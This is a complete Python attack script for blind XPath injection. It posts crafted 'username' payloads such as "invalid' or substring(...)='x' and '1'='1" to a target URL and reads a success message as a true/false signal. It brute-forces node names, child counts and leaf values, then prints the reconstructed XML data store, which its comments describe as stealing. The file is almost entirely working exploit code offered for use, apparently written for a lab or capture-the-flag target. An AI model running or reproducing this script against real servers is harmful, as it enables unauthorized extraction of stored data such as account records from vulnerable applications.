#!/usr/bin/python3

import sys
import requests
import string
import xml.etree.ElementTree as ET
from xml.dom import minidom

def enum_node_length(url:str, starting_node="", child_node=1) -> int:
    # bruteforce name length (keeps existing behavior)
    for i in range(1,100):
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        data = {"username": f"invalid' or string-length(name(/{starting_node}/*[{child_node}]))={i} and '1'='1"}
        success = "Message successfully sent!"
        try:
            response = requests.post(url, data=data, headers=headers)
            print(f"Trying value length: {i}")
            if success in response.text:
                print(f"------------------The length of the node is {i}------------------")
                return i
        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")

def bruteforce_node_name(url: str, node_length:int, starting_node="", starting_index="") -> str:
    node_name = ""
    for i in range(1, node_length + 1):
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        for ch in string.ascii_letters:
            data = {"username": f"invalid' or substring(name(/{starting_node}/*{starting_index}),{i},1)='{ch}' and '1'='1"}
            success = "Message successfully sent!"
            try:
                response = requests.post(url, data=data, headers=headers)
                print(f"Trying node_name: {node_name + ch}")
                if success in response.text:
                    node_name += ch
                    print("------------------Node Name Updated!------------------")
                    print(node_name)
                    break
            except requests.exceptions.RequestException as e:
                print(f"Error: {e}")
    print(f"Node Name Identified: {node_name}")
    return node_name

def find_and_yoink_child_nodes(url:str, node_name: str) -> int:
    # count and steal the children.
    for i in range(1,100):
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        data = {"username": f"invalid' or count(/{node_name}/*)={i} and '1'='1"}
        success = "Message successfully sent!"
        try:
            response = requests.post(url, data=data, headers=headers)
            print(f"Trying value length: {i}")
            if success in response.text:
                print(f"------------------{node_name} has {i} child nodes------------------")
                return  i
            elif i >= 99:
                print("node {node_name} has more than 100 children, or something went wrong.")
                return None
        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")

# -------------- NEW: value enumeration helpers ----------------

def enum_node_value_length(url: str, parent_path: str, child_index: int) -> int:
    """
    Determine the string-length(...) of the node at /{parent_path}/*[{child_index}]
    """
    for i in range(0, 200):  # allow 0-length values too
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        data = {"username": f"invalid' or string-length(/{parent_path}/*[{child_index}])={i} and '1'='1"}
        success = "Message successfully sent!"
        try:
            response = requests.post(url, data=data, headers=headers)
            print(f"Trying value length: {i}")
            if success in response.text:
                print(f"------------------Value length is {i}------------------")
                return i
        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")
    return None

def bruteforce_node_value(url: str, value_length: int, parent_path: str, child_index: int) -> str:
    """
    Bruteforce the text content of /{parent_path}/*[{child_index}] using substring(...).
    Avoids single-quote in candidates since payload uses single quotes.
    """
    value = ""
    # build candidate set (exclude single quote to avoid breaking the injection)
    candidates = string.ascii_letters + string.digits + string.punctuation.replace("'", "") + " "
    for pos in range(1, value_length + 1):
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        found = False
        for ch in candidates:
            # escape any backslashes just in case (simple approach)
            if ch == "\\":
                test_char = "\\\\"
            else:
                test_char = ch
            data = {"username": f"invalid' or substring(/{parent_path}/*[{child_index}],{pos},1)='{test_char}' and '1'='1"}
            success = "Message successfully sent!"
            try:
                response = requests.post(url, data=data, headers=headers)
                print(f"Trying value char (pos {pos}): {value + ch}")
                if success in response.text:
                    value += ch
                    print("------------------Value Updated!------------------")
                    print(value)
                    found = True
                    break
            except requests.exceptions.RequestException as e:
                print(f"Error: {e}")
        if not found:
            # if we didn't find a character, insert placeholder and continue
            print(f"Could not identify character at position {pos}; inserting '?' and continuing.")
            value += "?"
    print(f"Value Identified: {value}")
    return value

# -----------------------------------------------------------------

def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <url>")
        sys.exit(1)

    url = sys.argv[1]

    # discover root node length/name
    node_length = enum_node_length(url)
    if not node_length:
        print("Failed to enumerate root node length.")
        sys.exit(1)

    node_name = bruteforce_node_name(url, node_length)
    if not node_name:
        print("Failed to identify root node name.")
        sys.exit(1)

    root = ET.Element(node_name)

    # get number of children for root
    num_child_nodes = find_and_yoink_child_nodes(url, node_name)
    if not num_child_nodes:
        num_child_nodes = 0

    # stack entries: (parent_element, node_path, next_child_index, total_children)
    # node_path is the string you pass to the helpers (e.g. "accounts" or "accounts/*[1]")
    stack = [(root, node_name, 1, num_child_nodes)]

    while stack:
        parent_elem, parent_path, next_idx, total = stack[-1]

        # if we've processed all children of this parent, pop and continue
        if next_idx > total:
            stack.pop()
            continue

        # process child at index next_idx
        child_index = next_idx
        # increment next_child_index in-place on the stack
        stack[-1] = (parent_elem, parent_path, next_idx + 1, total)

        # determine child length and name using your existing helpers
        child_length = enum_node_length(url, parent_path, child_index)
        if not child_length:
            print(f"Could not determine length for child {child_index} of {parent_path}; skipping.")
            continue

        child_name = bruteforce_node_name(url, child_length, parent_path, f"[{child_index}]")
        if not child_name:
            print(f"Could not determine name for child {child_index} of {parent_path}; using 'unknown'.")
            child_name = "unknown"

        # attach child element
        child_elem = ET.SubElement(parent_elem, child_name)

        # build path for this child so helpers can count its children
        child_path = f"{parent_path}/*[{child_index}]"

        # find how many children this new child has
        child_children = find_and_yoink_child_nodes(url, child_path)
        if not child_children:
            child_children = 0

        # if this child has children, push it onto the stack for further exploration
        if child_children > 0:
            stack.append((child_elem, child_path, 1, child_children))
        else:
            # NEW: leaf node -> attempt to enumerate the node's value
            val_len = enum_node_value_length(url, parent_path, child_index)
            if val_len is None:
                print(f"Could not determine value length for {child_path}; skipping value fetch.")
            elif val_len == 0:
                print(f"Value for {child_path} is empty.")
                child_elem.text = ""
            else:
                value = bruteforce_node_value(url, val_len, parent_path, child_index)
                child_elem.text = value

    # finished building tree; pretty-print
    tree_str = ET.tostring(root, encoding='utf-8')
    pretty_xml = minidom.parseString(tree_str).toprettyxml(indent="  ")
    print(pretty_xml)


if __name__ == "__main__":
    main()
